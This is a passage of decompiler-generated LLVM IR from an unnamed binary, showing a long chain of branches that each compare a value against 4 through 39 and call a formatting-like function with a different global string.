  %v8_afcc = call i32 @function_92f8(i32 %v2_afa8, i32 ptrtoint ([12 x i8]* @global_var_2134c.63 to i32), i32 %v4_afcc, i32 %v6_afcc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_afd0

dec_label_pc_afd0:                                ; preds = %dec_label_pc_af9c, %dec_label_pc_afa8
  %v7_afd4 = icmp eq i32 %v2_aef8, 4
  br i1 %v7_afd4, label %dec_label_pc_afdc, label %dec_label_pc_b004

dec_label_pc_afdc:                                ; preds = %dec_label_pc_afd0
  %v2_afdc = ptrtoint i32* %stack_var_-36 to i32
  %v3_afe8 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_aff4 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b000 = sext i8 %v3_afe8 to i32
  %v6_b000 = sext i8 %v3_aff4 to i32
  %v8_b000 = call i32 @function_92f8(i32 %v2_afdc, i32 ptrtoint ([12 x i8]* @global_var_21358.65 to i32), i32 %v4_b000, i32 %v6_b000, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b004

dec_label_pc_b004:                                ; preds = %dec_label_pc_afd0, %dec_label_pc_afdc
  %v7_b008 = icmp eq i32 %v2_aef8, 5
  br i1 %v7_b008, label %dec_label_pc_b010, label %dec_label_pc_b038

dec_label_pc_b010:                                ; preds = %dec_label_pc_b004
  %v2_b010 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b01c = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b028 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b034 = sext i8 %v3_b01c to i32
  %v6_b034 = sext i8 %v3_b028 to i32
  %v8_b034 = call i32 @function_92f8(i32 %v2_b010, i32 ptrtoint ([12 x i8]* @global_var_21364.67 to i32), i32 %v4_b034, i32 %v6_b034, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b038

dec_label_pc_b038:                                ; preds = %dec_label_pc_b004, %dec_label_pc_b010
  %v7_b03c = icmp eq i32 %v2_aef8, 6
  br i1 %v7_b03c, label %dec_label_pc_b044, label %dec_label_pc_b06c

dec_label_pc_b044:                                ; preds = %dec_label_pc_b038
  %v2_b044 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b050 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b05c = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b068 = sext i8 %v3_b050 to i32
  %v6_b068 = sext i8 %v3_b05c to i32
  %v8_b068 = call i32 @function_92f8(i32 %v2_b044, i32 ptrtoint ([13 x i8]* @global_var_21370.69 to i32), i32 %v4_b068, i32 %v6_b068, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b06c

dec_label_pc_b06c:                                ; preds = %dec_label_pc_b038, %dec_label_pc_b044
  %v7_b070 = icmp eq i32 %v2_aef8, 7
  br i1 %v7_b070, label %dec_label_pc_b078, label %dec_label_pc_b0a0

dec_label_pc_b078:                                ; preds = %dec_label_pc_b06c
  %v2_b078 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b084 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b090 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b09c = sext i8 %v3_b084 to i32
  %v6_b09c = sext i8 %v3_b090 to i32
  %v8_b09c = call i32 @function_92f8(i32 %v2_b078, i32 ptrtoint ([13 x i8]* @global_var_21380.71 to i32), i32 %v4_b09c, i32 %v6_b09c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b0a0

dec_label_pc_b0a0:                                ; preds = %dec_label_pc_b06c, %dec_label_pc_b078
  %v7_b0a4 = icmp eq i32 %v2_aef8, 8
  br i1 %v7_b0a4, label %dec_label_pc_b0ac, label %dec_label_pc_b0d4

dec_label_pc_b0ac:                                ; preds = %dec_label_pc_b0a0
  %v2_b0ac = ptrtoint i32* %stack_var_-36 to i32
  %v3_b0b8 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b0c4 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b0d0 = sext i8 %v3_b0b8 to i32
  %v6_b0d0 = sext i8 %v3_b0c4 to i32
  %v8_b0d0 = call i32 @function_92f8(i32 %v2_b0ac, i32 ptrtoint ([13 x i8]* @global_var_21390.73 to i32), i32 %v4_b0d0, i32 %v6_b0d0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b0d4

dec_label_pc_b0d4:                                ; preds = %dec_label_pc_b0a0, %dec_label_pc_b0ac
  %v7_b0d8 = icmp eq i32 %v2_aef8, 9
  br i1 %v7_b0d8, label %dec_label_pc_b0e0, label %dec_label_pc_b108

dec_label_pc_b0e0:                                ; preds = %dec_label_pc_b0d4
  %v2_b0e0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b0ec = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b0f8 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b104 = sext i8 %v3_b0ec to i32
  %v6_b104 = sext i8 %v3_b0f8 to i32
  %v8_b104 = call i32 @function_92f8(i32 %v2_b0e0, i32 ptrtoint ([13 x i8]* @global_var_213a0.75 to i32), i32 %v4_b104, i32 %v6_b104, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b108

dec_label_pc_b108:                                ; preds = %dec_label_pc_b0d4, %dec_label_pc_b0e0
  %v7_b10c = icmp eq i32 %v2_aef8, 10
  br i1 %v7_b10c, label %dec_label_pc_b114, label %dec_label_pc_b13c

dec_label_pc_b114:                                ; preds = %dec_label_pc_b108
  %v2_b114 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b120 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b12c = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b138 = sext i8 %v3_b120 to i32
  %v6_b138 = sext i8 %v3_b12c to i32
  %v8_b138 = call i32 @function_92f8(i32 %v2_b114, i32 ptrtoint ([13 x i8]* @global_var_213b0.77 to i32), i32 %v4_b138, i32 %v6_b138, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b13c

dec_label_pc_b13c:                                ; preds = %dec_label_pc_b108, %dec_label_pc_b114
  %v7_b140 = icmp eq i32 %v2_aef8, 11
  br i1 %v7_b140, label %dec_label_pc_b148, label %dec_label_pc_b170

dec_label_pc_b148:                                ; preds = %dec_label_pc_b13c
  %v2_b148 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b154 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b160 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b16c = sext i8 %v3_b154 to i32
  %v6_b16c = sext i8 %v3_b160 to i32
  %v8_b16c = call i32 @function_92f8(i32 %v2_b148, i32 ptrtoint ([13 x i8]* @global_var_213c0.79 to i32), i32 %v4_b16c, i32 %v6_b16c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b170

dec_label_pc_b170:                                ; preds = %dec_label_pc_b13c, %dec_label_pc_b148
  %v7_b174 = icmp eq i32 %v2_aef8, 12
  br i1 %v7_b174, label %dec_label_pc_b17c, label %dec_label_pc_b1a4

dec_label_pc_b17c:                                ; preds = %dec_label_pc_b170
  %v2_b17c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b188 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b194 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b1a0 = sext i8 %v3_b188 to i32
  %v6_b1a0 = sext i8 %v3_b194 to i32
  %v8_b1a0 = call i32 @function_92f8(i32 %v2_b17c, i32 ptrtoint ([13 x i8]* @global_var_213d0.81 to i32), i32 %v4_b1a0, i32 %v6_b1a0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b1a4

dec_label_pc_b1a4:                                ; preds = %dec_label_pc_b170, %dec_label_pc_b17c
  %v7_b1a8 = icmp eq i32 %v2_aef8, 13
  br i1 %v7_b1a8, label %dec_label_pc_b1b0, label %dec_label_pc_b1d8

dec_label_pc_b1b0:                                ; preds = %dec_label_pc_b1a4
  %v2_b1b0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b1bc = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b1c8 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b1d4 = sext i8 %v3_b1bc to i32
  %v6_b1d4 = sext i8 %v3_b1c8 to i32
  %v8_b1d4 = call i32 @function_92f8(i32 %v2_b1b0, i32 ptrtoint ([13 x i8]* @global_var_213e0.83 to i32), i32 %v4_b1d4, i32 %v6_b1d4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b1d8

dec_label_pc_b1d8:                                ; preds = %dec_label_pc_b1a4, %dec_label_pc_b1b0
  %v7_b1dc = icmp eq i32 %v2_aef8, 14
  br i1 %v7_b1dc, label %dec_label_pc_b1e4, label %dec_label_pc_b20c

dec_label_pc_b1e4:                                ; preds = %dec_label_pc_b1d8
  %v2_b1e4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b1f0 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b1fc = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b208 = sext i8 %v3_b1f0 to i32
  %v6_b208 = sext i8 %v3_b1fc to i32
  %v8_b208 = call i32 @function_92f8(i32 %v2_b1e4, i32 ptrtoint ([12 x i8]* @global_var_213f0.85 to i32), i32 %v4_b208, i32 %v6_b208, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b20c

dec_label_pc_b20c:                                ; preds = %dec_label_pc_b1d8, %dec_label_pc_b1e4
  %v7_b210 = icmp eq i32 %v2_aef8, 15
  br i1 %v7_b210, label %dec_label_pc_b218, label %dec_label_pc_b240

dec_label_pc_b218:                                ; preds = %dec_label_pc_b20c
  %v2_b218 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b224 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b230 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b23c = sext i8 %v3_b224 to i32
  %v6_b23c = sext i8 %v3_b230 to i32
  %v8_b23c = call i32 @function_92f8(i32 %v2_b218, i32 ptrtoint ([12 x i8]* @global_var_213fc.87 to i32), i32 %v4_b23c, i32 %v6_b23c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b240

dec_label_pc_b240:                                ; preds = %dec_label_pc_b20c, %dec_label_pc_b218
  %v7_b244 = icmp eq i32 %v2_aef8, 16
  br i1 %v7_b244, label %dec_label_pc_b24c, label %dec_label_pc_b274

dec_label_pc_b24c:                                ; preds = %dec_label_pc_b240
  %v2_b24c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b258 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b264 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b270 = sext i8 %v3_b258 to i32
  %v6_b270 = sext i8 %v3_b264 to i32
  %v8_b270 = call i32 @function_92f8(i32 %v2_b24c, i32 ptrtoint ([13 x i8]* @global_var_21408.89 to i32), i32 %v4_b270, i32 %v6_b270, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b274

dec_label_pc_b274:                                ; preds = %dec_label_pc_b240, %dec_label_pc_b24c
  %v7_b278 = icmp eq i32 %v2_aef8, 17
  br i1 %v7_b278, label %dec_label_pc_b280, label %dec_label_pc_b2a8

dec_label_pc_b280:                                ; preds = %dec_label_pc_b274
  %v2_b280 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b28c = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b298 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b2a4 = sext i8 %v3_b28c to i32
  %v6_b2a4 = sext i8 %v3_b298 to i32
  %v8_b2a4 = call i32 @function_92f8(i32 %v2_b280, i32 ptrtoint ([13 x i8]* @global_var_21418.91 to i32), i32 %v4_b2a4, i32 %v6_b2a4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b2a8

dec_label_pc_b2a8:                                ; preds = %dec_label_pc_b274, %dec_label_pc_b280
  %v7_b2ac = icmp eq i32 %v2_aef8, 18
  br i1 %v7_b2ac, label %dec_label_pc_b2b4, label %dec_label_pc_b2dc

dec_label_pc_b2b4:                                ; preds = %dec_label_pc_b2a8
  %v2_b2b4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b2c0 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b2cc = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b2d8 = sext i8 %v3_b2c0 to i32
  %v6_b2d8 = sext i8 %v3_b2cc to i32
  %v8_b2d8 = call i32 @function_92f8(i32 %v2_b2b4, i32 ptrtoint ([13 x i8]* @global_var_21428.93 to i32), i32 %v4_b2d8, i32 %v6_b2d8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b2dc

dec_label_pc_b2dc:                                ; preds = %dec_label_pc_b2a8, %dec_label_pc_b2b4
  %v7_b2e0 = icmp eq i32 %v2_aef8, 19
  br i1 %v7_b2e0, label %dec_label_pc_b2e8, label %dec_label_pc_b310

dec_label_pc_b2e8:                                ; preds = %dec_label_pc_b2dc
  %v2_b2e8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b2f4 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b300 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b30c = sext i8 %v3_b2f4 to i32
  %v6_b30c = sext i8 %v3_b300 to i32
  %v8_b30c = call i32 @function_92f8(i32 %v2_b2e8, i32 ptrtoint ([12 x i8]* @global_var_21438.95 to i32), i32 %v4_b30c, i32 %v6_b30c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b310

dec_label_pc_b310:                                ; preds = %dec_label_pc_b2dc, %dec_label_pc_b2e8
  %v7_b314 = icmp eq i32 %v2_aef8, 20
  br i1 %v7_b314, label %dec_label_pc_b31c, label %dec_label_pc_b344

dec_label_pc_b31c:                                ; preds = %dec_label_pc_b310
  %v2_b31c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b328 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b334 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b340 = sext i8 %v3_b328 to i32
  %v6_b340 = sext i8 %v3_b334 to i32
  %v8_b340 = call i32 @function_92f8(i32 %v2_b31c, i32 ptrtoint ([12 x i8]* @global_var_21444.97 to i32), i32 %v4_b340, i32 %v6_b340, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b344

dec_label_pc_b344:                                ; preds = %dec_label_pc_b310, %dec_label_pc_b31c
  %v7_b348 = icmp eq i32 %v2_aef8, 21
  br i1 %v7_b348, label %dec_label_pc_b350, label %dec_label_pc_b378

dec_label_pc_b350:                                ; preds = %dec_label_pc_b344
  %v2_b350 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b35c = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b368 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b374 = sext i8 %v3_b35c to i32
  %v6_b374 = sext i8 %v3_b368 to i32
  %v8_b374 = call i32 @function_92f8(i32 %v2_b350, i32 ptrtoint ([13 x i8]* @global_var_21450.99 to i32), i32 %v4_b374, i32 %v6_b374, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b378

dec_label_pc_b378:                                ; preds = %dec_label_pc_b344, %dec_label_pc_b350
  %v7_b37c = icmp eq i32 %v2_aef8, 22
  br i1 %v7_b37c, label %dec_label_pc_b384, label %dec_label_pc_b3ac

dec_label_pc_b384:                                ; preds = %dec_label_pc_b378
  %v2_b384 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b390 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b39c = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b3a8 = sext i8 %v3_b390 to i32
  %v6_b3a8 = sext i8 %v3_b39c to i32
  %v8_b3a8 = call i32 @function_92f8(i32 %v2_b384, i32 ptrtoint ([12 x i8]* @global_var_21460.101 to i32), i32 %v4_b3a8, i32 %v6_b3a8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b3ac

dec_label_pc_b3ac:                                ; preds = %dec_label_pc_b378, %dec_label_pc_b384
  %v7_b3b0 = icmp eq i32 %v2_aef8, 23
  br i1 %v7_b3b0, label %dec_label_pc_b3b8, label %dec_label_pc_b3e0

dec_label_pc_b3b8:                                ; preds = %dec_label_pc_b3ac
  %v2_b3b8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b3c4 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b3d0 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b3dc = sext i8 %v3_b3c4 to i32
  %v6_b3dc = sext i8 %v3_b3d0 to i32
  %v8_b3dc = call i32 @function_92f8(i32 %v2_b3b8, i32 ptrtoint ([14 x i8]* @global_var_2146c.103 to i32), i32 %v4_b3dc, i32 %v6_b3dc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b3e0

dec_label_pc_b3e0:                                ; preds = %dec_label_pc_b3ac, %dec_label_pc_b3b8
  %v7_b3e4 = icmp eq i32 %v2_aef8, 24
  br i1 %v7_b3e4, label %dec_label_pc_b3ec, label %dec_label_pc_b414

dec_label_pc_b3ec:                                ; preds = %dec_label_pc_b3e0
  %v2_b3ec = ptrtoint i32* %stack_var_-36 to i32
  %v3_b3f8 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b404 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b410 = sext i8 %v3_b3f8 to i32
  %v6_b410 = sext i8 %v3_b404 to i32
  %v8_b410 = call i32 @function_92f8(i32 %v2_b3ec, i32 ptrtoint ([11 x i8]* @global_var_2147c.105 to i32), i32 %v4_b410, i32 %v6_b410, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b414

dec_label_pc_b414:                                ; preds = %dec_label_pc_b3e0, %dec_label_pc_b3ec
  %v7_b418 = icmp eq i32 %v2_aef8, 25
  br i1 %v7_b418, label %dec_label_pc_b420, label %dec_label_pc_b448

dec_label_pc_b420:                                ; preds = %dec_label_pc_b414
  %v2_b420 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b42c = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b438 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b444 = sext i8 %v3_b42c to i32
  %v6_b444 = sext i8 %v3_b438 to i32
  %v8_b444 = call i32 @function_92f8(i32 %v2_b420, i32 ptrtoint ([11 x i8]* @global_var_21488.107 to i32), i32 %v4_b444, i32 %v6_b444, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b448

dec_label_pc_b448:                                ; preds = %dec_label_pc_b414, %dec_label_pc_b420
  %v7_b44c = icmp eq i32 %v2_aef8, 26
  br i1 %v7_b44c, label %dec_label_pc_b454, label %dec_label_pc_b47c

dec_label_pc_b454:                                ; preds = %dec_label_pc_b448
  %v2_b454 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b460 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b46c = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b478 = sext i8 %v3_b460 to i32
  %v6_b478 = sext i8 %v3_b46c to i32
  %v8_b478 = call i32 @function_92f8(i32 %v2_b454, i32 ptrtoint ([12 x i8]* @global_var_21494.109 to i32), i32 %v4_b478, i32 %v6_b478, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b47c

dec_label_pc_b47c:                                ; preds = %dec_label_pc_b448, %dec_label_pc_b454
  %v7_b480 = icmp eq i32 %v2_aef8, 27
  br i1 %v7_b480, label %dec_label_pc_b488, label %dec_label_pc_b4b0

dec_label_pc_b488:                                ; preds = %dec_label_pc_b47c
  %v2_b488 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b494 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b4a0 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b4ac = sext i8 %v3_b494 to i32
  %v6_b4ac = sext i8 %v3_b4a0 to i32
  %v8_b4ac = call i32 @function_92f8(i32 %v2_b488, i32 ptrtoint ([12 x i8]* @global_var_214a0.111 to i32), i32 %v4_b4ac, i32 %v6_b4ac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b4b0

dec_label_pc_b4b0:                                ; preds = %dec_label_pc_b47c, %dec_label_pc_b488
  %v7_b4b4 = icmp eq i32 %v2_aef8, 28
  br i1 %v7_b4b4, label %dec_label_pc_b4bc, label %dec_label_pc_b4e4

dec_label_pc_b4bc:                                ; preds = %dec_label_pc_b4b0
  %v2_b4bc = ptrtoint i32* %stack_var_-36 to i32
  %v3_b4c8 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b4d4 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b4e0 = sext i8 %v3_b4c8 to i32
  %v6_b4e0 = sext i8 %v3_b4d4 to i32
  %v8_b4e0 = call i32 @function_92f8(i32 %v2_b4bc, i32 ptrtoint ([12 x i8]* @global_var_214ac.113 to i32), i32 %v4_b4e0, i32 %v6_b4e0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b4e4

dec_label_pc_b4e4:                                ; preds = %dec_label_pc_b4b0, %dec_label_pc_b4bc
  %v7_b4e8 = icmp eq i32 %v2_aef8, 29
  br i1 %v7_b4e8, label %dec_label_pc_b4f0, label %dec_label_pc_b518

dec_label_pc_b4f0:                                ; preds = %dec_label_pc_b4e4
  %v2_b4f0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b4fc = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b508 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b514 = sext i8 %v3_b4fc to i32
  %v6_b514 = sext i8 %v3_b508 to i32
  %v8_b514 = call i32 @function_92f8(i32 %v2_b4f0, i32 ptrtoint ([13 x i8]* @global_var_214b8.115 to i32), i32 %v4_b514, i32 %v6_b514, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b518

dec_label_pc_b518:                                ; preds = %dec_label_pc_b4e4, %dec_label_pc_b4f0
  %v7_b51c = icmp eq i32 %v2_aef8, 30
  br i1 %v7_b51c, label %dec_label_pc_b524, label %dec_label_pc_b54c

dec_label_pc_b524:                                ; preds = %dec_label_pc_b518
  %v2_b524 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b530 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b53c = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b548 = sext i8 %v3_b530 to i32
  %v6_b548 = sext i8 %v3_b53c to i32
  %v8_b548 = call i32 @function_92f8(i32 %v2_b524, i32 ptrtoint ([13 x i8]* @global_var_214c8.117 to i32), i32 %v4_b548, i32 %v6_b548, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b54c

dec_label_pc_b54c:                                ; preds = %dec_label_pc_b518, %dec_label_pc_b524
  %v7_b550 = icmp eq i32 %v2_aef8, 31
  br i1 %v7_b550, label %dec_label_pc_b558, label %dec_label_pc_b580

dec_label_pc_b558:                                ; preds = %dec_label_pc_b54c
  %v2_b558 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b564 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b570 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b57c = sext i8 %v3_b564 to i32
  %v6_b57c = sext i8 %v3_b570 to i32
  %v8_b57c = call i32 @function_92f8(i32 %v2_b558, i32 ptrtoint ([14 x i8]* @global_var_214d8.119 to i32), i32 %v4_b57c, i32 %v6_b57c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b580

dec_label_pc_b580:                                ; preds = %dec_label_pc_b54c, %dec_label_pc_b558
  %v7_b584 = icmp eq i32 %v2_aef8, 32
  br i1 %v7_b584, label %dec_label_pc_b58c, label %dec_label_pc_b5b4

dec_label_pc_b58c:                                ; preds = %dec_label_pc_b580
  %v2_b58c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b598 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b5a4 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b5b0 = sext i8 %v3_b598 to i32
  %v6_b5b0 = sext i8 %v3_b5a4 to i32
  %v8_b5b0 = call i32 @function_92f8(i32 %v2_b58c, i32 ptrtoint ([14 x i8]* @global_var_214e8.121 to i32), i32 %v4_b5b0, i32 %v6_b5b0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b5b4

dec_label_pc_b5b4:                                ; preds = %dec_label_pc_b580, %dec_label_pc_b58c
  %v7_b5b8 = icmp eq i32 %v2_aef8, 33
  br i1 %v7_b5b8, label %dec_label_pc_b5c0, label %dec_label_pc_b5e8

dec_label_pc_b5c0:                                ; preds = %dec_label_pc_b5b4
  %v2_b5c0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b5cc = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b5d8 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b5e4 = sext i8 %v3_b5cc to i32
  %v6_b5e4 = sext i8 %v3_b5d8 to i32
  %v8_b5e4 = call i32 @function_92f8(i32 %v2_b5c0, i32 ptrtoint ([13 x i8]* @global_var_214f8.123 to i32), i32 %v4_b5e4, i32 %v6_b5e4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b5e8

dec_label_pc_b5e8:                                ; preds = %dec_label_pc_b5b4, %dec_label_pc_b5c0
  %v7_b5ec = icmp eq i32 %v2_aef8, 34
  br i1 %v7_b5ec, label %dec_label_pc_b5f4, label %dec_label_pc_b61c

dec_label_pc_b5f4:                                ; preds = %dec_label_pc_b5e8
  %v2_b5f4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b600 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b60c = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b618 = sext i8 %v3_b600 to i32
  %v6_b618 = sext i8 %v3_b60c to i32
  %v8_b618 = call i32 @function_92f8(i32 %v2_b5f4, i32 ptrtoint ([13 x i8]* @global_var_21508.125 to i32), i32 %v4_b618, i32 %v6_b618, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b61c

dec_label_pc_b61c:                                ; preds = %dec_label_pc_b5e8, %dec_label_pc_b5f4
  %v7_b620 = icmp eq i32 %v2_aef8, 35
  br i1 %v7_b620, label %dec_label_pc_b628, label %dec_label_pc_b650

dec_label_pc_b628:                                ; preds = %dec_label_pc_b61c
  %v2_b628 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b634 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b640 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b64c = sext i8 %v3_b634 to i32
  %v6_b64c = sext i8 %v3_b640 to i32
  %v8_b64c = call i32 @function_92f8(i32 %v2_b628, i32 ptrtoint ([13 x i8]* @global_var_21518.127 to i32), i32 %v4_b64c, i32 %v6_b64c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b650

dec_label_pc_b650:                                ; preds = %dec_label_pc_b61c, %dec_label_pc_b628
  %v7_b654 = icmp eq i32 %v2_aef8, 36
  br i1 %v7_b654, label %dec_label_pc_b65c, label %dec_label_pc_b684

dec_label_pc_b65c:                                ; preds = %dec_label_pc_b650
  %v2_b65c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b668 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b674 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b680 = sext i8 %v3_b668 to i32
  %v6_b680 = sext i8 %v3_b674 to i32
  %v8_b680 = call i32 @function_92f8(i32 %v2_b65c, i32 ptrtoint ([13 x i8]* @global_var_21528.129 to i32), i32 %v4_b680, i32 %v6_b680, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b684

dec_label_pc_b684:                                ; preds = %dec_label_pc_b650, %dec_label_pc_b65c
  %v7_b688 = icmp eq i32 %v2_aef8, 37
  br i1 %v7_b688, label %dec_label_pc_b690, label %dec_label_pc_b6b8

dec_label_pc_b690:                                ; preds = %dec_label_pc_b684
  %v2_b690 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b69c = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b6a8 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b6b4 = sext i8 %v3_b69c to i32
  %v6_b6b4 = sext i8 %v3_b6a8 to i32
  %v8_b6b4 = call i32 @function_92f8(i32 %v2_b690, i32 ptrtoint ([13 x i8]* @global_var_21538.131 to i32), i32 %v4_b6b4, i32 %v6_b6b4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b6b8

dec_label_pc_b6b8:                                ; preds = %dec_label_pc_b684, %dec_label_pc_b690
  %v7_b6bc = icmp eq i32 %v2_aef8, 38
  br i1 %v7_b6bc, label %dec_label_pc_b6c4, label %dec_label_pc_b6ec

dec_label_pc_b6c4:                                ; preds = %dec_label_pc_b6b8
  %v2_b6c4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b6d0 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_b6dc = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_b6e8 = sext i8 %v3_b6d0 to i32
  %v6_b6e8 = sext i8 %v3_b6dc to i32
  %v8_b6e8 = call i32 @function_92f8(i32 %v2_b6c4, i32 ptrtoint ([13 x i8]* @global_var_21548.133 to i32), i32 %v4_b6e8, i32 %v6_b6e8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b6ec

dec_label_pc_b6ec:                                ; preds = %dec_label_pc_b6b8, %dec_label_pc_b6c4
  %v7_b6f0 = icmp eq i32 %v2_aef8, 39
  br i1 %v7_b6f0, label %dec_label_pc_b6f8, label %dec_label_pc_b720

dec_label_pc_b6f8:                                ; preds = %dec_label_pc_b6ec
